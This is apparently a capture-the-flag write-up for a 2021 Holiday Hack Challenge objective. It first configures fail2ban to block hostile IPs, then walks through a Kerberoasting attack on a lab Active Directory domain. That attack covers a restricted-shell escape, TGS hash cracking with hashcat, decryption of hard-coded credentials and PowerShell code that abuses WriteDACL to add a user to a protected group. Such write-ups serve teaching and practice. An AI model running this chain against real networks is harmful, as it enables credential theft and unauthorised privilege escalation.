 {%- block htmltitle -%} 
   {%- if page and page.meta and page.meta.title -%} 
     <title>{{ page.meta.title }}</title> 
   {%- elif page and page.title and not page.is_homepage -%} 
     <title>{{ page.title }} - {{ config.site_name }}</title> 
   {%- else -%} 
     <title>{{ config.site_name }}</title> 
   {%- endif -%} 
 {%- endblock -%} 
<table border=1px>
<tr>
    <td colspan=3>
    <b>Challenge : </b> <br>
    Obtain the secret sleigh research document from a host on the Elf University domain.<br>
    What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? <br>
    Start by registering as a student on the ElfU Portal. Find Eve Snowshoes in Santa's office for hints.
    </td>
</tr>
<tr>
    <td>
    <b>Difficulty Level : </b> <br>
    <img src="../../images/hhc2021/difficulty_5.png" alt="drawing" width="100px"/><br>
    </td>
    <td>
     <b>Location : </b> <br>
    Santa’s Office 
    </td>
    <td>
    <b>Elf/Troll : </b> <br>
   <img src="../../images/hhc2021/image010.png" alt="drawing" width="30px"/> Eve Snowshoes <br>
    </td>
</tr>
</table>

<table>
<tr>
    <td>
    <img src="../../images/hhc2021/image082.png" alt="drawing" width="300px"/>
    </td>
    <td>
        Please note this objective was not near Eve Snowshoes but since they provided such cool hints, I wanted to keep this elf here. <br>
        <b>Hints from Eve Snowshoes : </b> (Because we solved their terminal challenge “HoHo…No”) <br>
        <ol>
        <li>There's a great talk by Chris Davis on this exact subject!</li>
        <li>There are also plenty of resources available to learn more about Kerberoasting specifically.</li>
        <li>If you have any trouble finding the domain controller on the 10.X.X.X network, remember that, when not running as root, nmap default probing relies on connecting to TCP 80 and 443.</li>
        <li>Got a hash that won't crack with your wordlist? OneRuleToRuleThemAll.rule is a great way to grow your keyspace.</li>
        <li>Where'd you get your wordlist? CeWL might generate a great wordlist from the ElfU website,but it will ignore digits in terms by default.</li>
        </ol>
        <b>Website:</b><br>
        <a href="https://register.elfu.org/register" target=_blank>https://register.elfu.org/register</a>
    </td>
<tr>
</table>


We first solve the HoHo..No terminal challenge from Eve Snowshoes.

### HoHo..No Terminal Challenge
This terminal challenge needs us to identify the malicious IP addresses in the logs and add them to the naughty list so It could be blocked using fail2ban.

Thre is an excellent talk by Mr. Andy Smith on <a href="https://www.youtube.com/watch?v=Fwv2-uV6e5I" target=_blank>Fail2ban</a> whicih immensely helped in solving this terminal challenge.
<img src="../../images/hhc2021/image083.png" alt="drawing" width="800px"/>

<b> First find all the patterns of log entries in the/var/log/hohono.log </b> <br>
Exclude all the successful logins or valid heartbeats and put other in ashish.log. <br>

```bash
cat /var/log/hohono.log | grep -v -e "success" -e "Valid heartbeat" > ashish.log
```

Replace all the IP addresses in ashish.log with naughty_ip 
```bash
sed -i -e 's/[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}/naughty_ip/g' ashish.log
```
Get only the messages
```bash
cat ashish.log | cut -d ' ' -f3- | sort | uniq
```

Sample Unique log entries <br>
<img src="../../images/hhc2021/image084.png" alt="drawing" width="800px"/>

Unique patterns of the log entries <br>

>Failed login from <host> for user<br>
>Invalid heartbeat '<user>' from <host><br>
>Login from <host> rejected due to unknown user name<br>
><host> sent a malformed request<br>

Now we can create the custom jail and then filter and actions for the custom jail. <br>

<b>Creating the custom jail</b> <br>
```bash
nano /etc/fail2ban/jail.d/my_jail.conf
```
Below would be the content of the my_jail.conf 
```json
[my_jail]
enabled = true
logpath = /var/log/hohono.log
findtime = 60m
maxretry = 10
bantime = 30m
filter = my_filter
action = my_action
```

<b>Creating the custom filter</b> <br>
```bash
nano /etc/fail2ban/filter.d/my_filter.conf
```

Below would be the content of the my_filter.conf 
```json
[Definition]
failregex = <HOST> sent a malformed request$
Failed login from <HOST>
Login from <HOST> rejected due to unknown user name$
Invalid heartbeat \S+ from <HOST>$
```

<b>Creating the custom action</b> <br>
```bash
nano /etc/fail2ban/filter.d/my_action.conf
```

Below would be the content of the my_action.conf <br>
Please note this is where we add the IP addresses we have identified to get added to the naughtly list to ban using fail2ban.
```json
[Definition]
actionban   = /root/naughtylist add <ip>
actionunban = /root/naughtylist add <ip>
```
<b>Restart the fail2ban service</b> <br>
```bash
service fail2ban restart
```

<b>Refresh the naughtylist</b> <br>
```bash
./naughtylist refresh
```

<b>Achievement unlocked :</b> <br>
<img src="../../images/hhc2021/image085.png" alt="drawing" width="1000px"/>

Now we go over to objective#8 Kerberoasting

### Registration and SSH to elfu.local domain
We register on https://register.elfu.org/register using a custom domain. <br>
We are provided a domain user named <b>rflkkildwi</b> and the password for it.<br>

SSH to grades.elfu.local as <b>rflkkildwi</b> : <br>
<img src="../../images/hhc2021/image086.png" alt="drawing" width="600px"/>

We see the below menu:<br>
<img src="../../images/hhc2021/image087.png" alt="drawing" width="600px"/>

We escape the SSD using Ctrl+D.<br>
Once in Python, use below to spawn an interactive bash shell.<br>

```python
import pty; pty.spawn("/bin/bash")  
```
Conduct reconnaissance : <br>
Username and Hostname : <br>
<img src="../../images/hhc2021/image088.png" alt="drawing" width="300px"/><br>
Local IP : <br>
<img src="../../images/hhc2021/image089.png" alt="drawing" width="300px"/><br>
Get the neighbours. There are 4 of them. <br>
<img src="../../images/hhc2021/image090.png" alt="drawing" width="600px"/>

Conduct nmap scan on top 10 ports on each of those hosts to know what services are running there. <br>
Looks like 172.17.0.4 and 172.17.0.5 are running SMB and may have shared folders. <br>

<table>
    <tr>
        <th>nmap -top-ports 10 172.17.0.4</th>
        <th>nmap -top-ports 10 172.17.0.5</th>
    <tr>
    <tr>
        <td><img src="../../images/hhc2021/image091.png" alt="drawing" width="600px"/></td>
        <td><img src="../../images/hhc2021/image092.png" alt="drawing" width="600px"/></td>
    <tr>   
</table>

We look for shared folders on 172.17.0.4 and 172.17.0.5 <br>
Looks like 172.17.0.5 has two shared folders but the user rfkkildwi does not have access on these shares<br>

<ol>
    <li>\\172.17.0.5 \elfu_svc_shr</li>
    <li>\\172.17.0.5 \research_dep</li>
</ol>

Request TGS ticket for the users in Hashcat format. 
The ticket is encrypted with account’s password so it can be brute forced offline.
<img src="../../images/hhc2021/image093.png" alt="drawing" width="1000px"/>


### Cracking the TGS hash for elfu.local\elfu_svc to get plaintext password
#### Downloading the OneRuleToRuleThemAll.rule
We have the TGS hash for elfu_svc form previous step. <br>
We copy the has to local kali machine as hash.txt.<br>
We will download OneRuleToRuleThemAll.rule from <a href="https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule" target=_blank>here</a>.<br>

```bash
wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule > OneRuleToRuleThemAll.rule
```

#### Generate the word list
Generate the word list using CeWL with –with-number option so it does not ignore digits. </br>
```bash
cewl --with-numbers https://register.elfu.org/register  > wordlist.txt
```

### Crack the TGS hash using Hashcat
Now we use the OneRuleToRuleThemAll.rule and wordlist.txt with Hashcat. <br>

```bash
hashcat -m 13100 -a 0 hash.txt --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 wordlist.txt
```
We have the plaintext password for elfu_svc. <br>
<b>Snow2021!</b>
<img src="../../images/hhc2021/image095.png" alt="drawing" width="1200px"/>

#### Enumerate the file share "elfu_svc_shr" and get hard coded creds for remote_elf in the script
```bash
smbclient \\\\172.17.0.5\\elfu_svc_shr -U=elfu_svc
```
Enter the password “Snow2021!” (Without quotes). <br>
And now we are able to enumerate all the files. <br>
<img src="../../images/hhc2021/image096.png" alt="drawing" width="1200px"/>

Check for any hard coded passwords. <br>
```bash
#Set the prompt Off
prompt OFF
#Download all the files
mget *
#Exit out of the smbclient
exit
#Grep for ConvertTo-SecureString in all the files since you use that on plain text creds to convert to # secure strings
grep -C 2 ConvertTo-SecureString *
```

<img src="../../images/hhc2021/image097.png" alt="drawing" width="1200px"/>

Looks like GetProcessInfo.ps1 has the hard coded credentials for another domain user named elfu.local\remote_elfu for a host 10.128.1.53. <br>
The credentials look encrypted though. So, we may to convert that to plain text.<br>

<img src="../../images/hhc2021/image098.png" alt="drawing" width="1200px"/>

#### Get the password for the elfu.local\remote_elf
Run this in the terminal PowerShell 7 <br>
```powershell
$key = (2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7)
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key $key
ConvertFrom-SecureString -SecureString $aPass -AsPlainText 
```
<img src="../../images/hhc2021/image099.png" alt="drawing" width="1200px"/>
We have the password for elfu.local\remote_elf: <br> 
<b>A1d655f7f5d98b10!</b>

#### Logon To Domain controller (DC01) using elfu.local\remote_elf
At this point we have the password for elfu.local\remote_elf which is <b>A1d655f7f5d98b10!</b>.<br>
But this user also does not have access to \\172.17.0.5\research_dep. <br>
So, we may need to escalate privileges of our user (rflkkildwi) and let's see if we can leverage elfu.local\remote_elf for that.<br>

Let’s login to the host 10.128.1.53 using elfu.local\remote_elf.<br>
First enter into PowerShell


```bash
pwsh
```
<img src="../../images/hhc2021/image099_1.png" alt="drawing" width="400px"/>

Get the PSCredential object using the secure string.<br>
```powershell
# Setting up the creds
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
```
<img src="../../images/hhc2021/image100.png" alt="drawing" width="1200px"/>

Using the creds above, create a new PowerShell session on 10.128.1.53 <br>
```powershell
New-PSSession -Computer 10.128.1.53 -Credential $aCred
```
A new PowerShell session is created with id 1. <br>
<img src="../../images/hhc2021/image101.png" alt="drawing" width="1200px"/>

We enter the PowerShell session of 10.128.1.53 with name DC01 which looks like a domain controller when examining with Get-ADDomainController.
```powershell
Enter-PSSession -Id 1
Get-ADDomainController -Discover -domain "elfu.local" -Service "PrimaryDC","TimeService"
```
<img src="../../images/hhc2021/image102.png" alt="drawing" width="1200px"/>

### Privilege Escalation 
This involves escalating privileges of our user "rflkkildwi".<br>
We do this by adding this user  to "Research Department" AD group leveraging elfu.local\remote_elf.

<b>Find which AD group the user elfu.local\remote_elf has writeDACL permission.</b></br>
Tried with domain admins. This does not have writeDACL permission for remote_elf. <br>
```powershell
$ADSI = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=elfu,DC=local"
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount]) 
```
So, we numerate all the groups to see if something interesting come up. <br>

Get-ADGroup to get all AD groups : <br>
<img src="../../images/hhc2021/image103.png" alt="drawing" width="800px"/><br>
This “Research Department” group looks interesting : <br>
<img src="../../images/hhc2021/image104.png" alt="drawing" width="800px"/>

We see all the Access rules for Research Department and we can see remote_elf has writeDACL permission on that group. <br>
```powershell
$ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local" 
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
```
<img src="../../images/hhc2021/image105.png" alt="drawing" width="800px"/>

<b>Using remote_elf, add "GenericAll" permission for the user "rflkkildwi" to the identified AD group. </b>
```powershell
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "rflkkildwi"
$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$secOptions = $domainDirEntry.get_Options()
$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$domainDirEntry.RefreshCache()
$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```
We can verify if the GenericAll permission has been added for user "rflkkildwi" for AD group "Research Department" <br>
```powershell
$ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local" 
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
```
<img src="../../images/hhc2021/image106.png" alt="drawing" width="800px"/>

<b>Using remote_elf, add user "rflkkildwi" to the identified AD group.</b> <br>
```powershell
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "rflkkildwi"
$password = "Pvwevsviq#"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
$b=New-Object byte[] $sid.BinaryLength
$sid.GetBinaryForm($b,0)
$hexSID=[BitConverter]::ToString($b).Replace('-','')
$domainDirEntry.Add("LDAP://<SID=$hexSID>")
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```
We can verify if the user  "rflkkildwi" to the "Research Department" group. <br>
```powershell
Get-ADGroupMember -Identity 'ResearchDepartment' | Where-Object {$_.name -eq "rflkkildwi"}
```

<img src="../../images/hhc2021/image107.png" alt="drawing" width="1200px"/>

### Access the secret document 
At this point rflkkildwi is added to the "Research Department" group. <br>
So now we can access the document in the share '\\172.17.0.5\research_dep' using "rflkkildwi" . <br>
```powershell
smbclient '\\172.17.0.5\research_dep'
```
<img src="../../images/hhc2021/image108.png" alt="drawing" width="800px"/>

Also can download the PDF from the share to the grade.elfu.local.<br>
<img src="../../images/hhc2021/image109.png" alt="drawing" width="800px"/>

<b>Change the shell to bin/bash on the grades.elfu.org session</b><br>
Enter chsh to change your shell to /bin/bash.
```bash
chsh
```
<img src="../../images/hhc2021/image110.png" alt="drawing" width="800px"/>

<b>From local kali box download the document from the grades.elfu.org.</b><br>
<img src="../../images/hhc2021/image111.png" alt="drawing" width="1200px"/>

Open the PDF locally to see the 1st secret ingredient – <b>kindness</b> <br>
We use that as the answer for the objective and now the objective is completed.
<img src="../../images/hhc2021/image112.png" alt="drawing" width="1200px"/>
<img src="../../images/hhc2021/image113.png" alt="drawing" width="400px"/>
